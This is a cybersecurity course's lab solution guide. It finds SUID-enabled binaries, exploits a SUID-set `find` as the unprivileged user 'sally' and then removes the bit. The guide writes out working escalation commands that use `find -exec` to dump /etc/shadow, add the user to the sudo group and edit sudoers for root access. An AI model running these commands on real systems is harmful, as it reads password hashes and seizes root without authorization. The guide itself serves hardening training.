## Solution Guide: Shutting Out `SUID`

For this activity, we found all the files that have `SUID` set, and compared them against the list provided by the senior administrator. We then checked for vulnerabilities, and removed the `SUID` from programs that shouldn't have had it set. 

To complete this activity we needed to:

- Run the `find` command to find all `SUID` bit-enabled programs.

- Compare the list against the list provided and verify one of the programs not on the list.

- Switch to another user and attempt to exploit the program found.

- Run the correct command to remove the `SUID`  bit from the program, and verify this command worked.


Start by searching the `/usr/bin` directory for all files that have the `SUID` bit set.

- Run `find /usr/bin -perm -4000`

  - `/usr/bin/find` is showing in the list.

- Run `ls -l /usr/bin/find` to verify that the `SUID` bit is set, using a long listing.

Switch to a user that does not have `sudo` privileges, like `sally`.

- Run `su sally` (password: `123456`)

- Run `sudo -l` to verify that `sally` has no `sudo` access.

- Run `find / -iname 'etc' -exec whoami \;`

**Bonus Task 1**: Use `find` to read or make a copy of `/etc/shadow`.

- Run `find /etc -iname 'shadow' -exec cat {} \;` to print the contents of `/etc/shadow`.

- Run `find /etc -iname 'shadow' -exec cat {} \; > shadow.txt` to save it to a file.

- Run `cat shadow.txt` to verify it is saved. 

**Bonus Task 2**: Use `find` to gain `sudo` or `root` access.

 This action can be completed by adding yourself to the `sudo` group:

- Run `find /etc -iname 'shadow' -exec usermod -aG sudo sally \;`

  - `find /etc -iname 'shadow'` is the example we used earlier to find a file that we know exists.
    - This is used just to activate the `-exec` portion of the command.
  - `-exec` stands for _execute_ and allows you to run a second command.
  - `usermod -aG sudo sally` is the `usermod` command that we used in the last class to add a user to the `sudo` group.
  - `\;` closes the `find` command.


For this change to work, you will have to log out and log back in to this user.

- Run `exit` to log out.

- Run `su sally` to log back in.

- Run `groups` to verify.

- Run `sudo su` to get a root shell.

To remove `sally` from the `sudo` group:

- Run `usermod -G sally sally` while still logged in as `root`

- Then, run `exit` to log out of the root user.

As another way to escalate privileges, you could use this `find` exploit to edit the `sudoers` file and add yourself with full `sudo` access.

- Run `find /etc -iname 'shadow' -exec visudo \;`

- Add the line `sally (ALL:ALL) ALL` under the `# User privilege specification` section.

  ```bash
  # User privilege specification
  root    ALL=(ALL:ALL) ALL
  sally   ALL=(ALL:ALL) ALL
  ```

Save and exit with `^X`, `y` and `enter`.

- Run `sudo -l` and enter the password for `sally`.

- Run `sudo su` to get a root shell.

After verifying these vulnerabilities, we remove the `SUID` bit from the `find` command.

To get the path for the find command: 

- Run `which find`

Remove the `SUID` and `GUID` bits: 

- Run `chmod 0755 /usr/bin/find` while still logged in as `root`.

Verify they have been removed: 

- Run `ls -l /usr/bin/find`

Remove the line for `sally`, exit the `sally` user, and exit back to the `sysadmin` user. 

- Run `visudo` and remove the line for `sally`.

- Run `exit` to exit to the `sally` user.

- Run `exit` again to exit back to the `sysadmin` user.

---

© 2020 Trilogy Education Services, a 2U, Inc. brand. All Rights Reserved.
